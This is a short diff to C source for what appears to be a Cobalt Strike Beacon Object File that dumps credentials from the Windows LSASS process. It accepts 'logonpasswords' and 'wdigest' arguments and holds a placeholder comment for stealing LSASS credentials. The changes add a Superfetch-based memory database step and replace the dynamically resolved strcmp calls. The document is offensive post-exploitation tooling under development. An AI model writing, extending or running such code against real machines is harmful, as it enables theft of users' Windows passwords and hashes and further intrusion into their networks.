@@ -6,6 +6,8 @@
 
 #include "utils.c"
 #include "privileges.c"
+#include "superfetch.c"
+
 
 int go(char *args, int argLen)
 {
@@ -19,7 +21,7 @@ int go(char *args, int argLen)
         return FALSE;
     }
 
-    if ( (MSVCRT$strcmp(argument, "logonpasswords") != 0) && (MSVCRT$strcmp(argument, "wdigest") != 0) )
+    if ( (strcmp(argument, "logonpasswords") != 0) && (strcmp(argument, "wdigest") != 0) )
     {
         BeaconPrintf(CALLBACK_ERROR, "Invalid argument!");
         return FALSE;
@@ -55,7 +57,7 @@ int go(char *args, int argLen)
 
 
     // Build Global Database
-
+    CreateGlobalSuperfetchDatabase();
 
     // StealLsassCredentials()
 
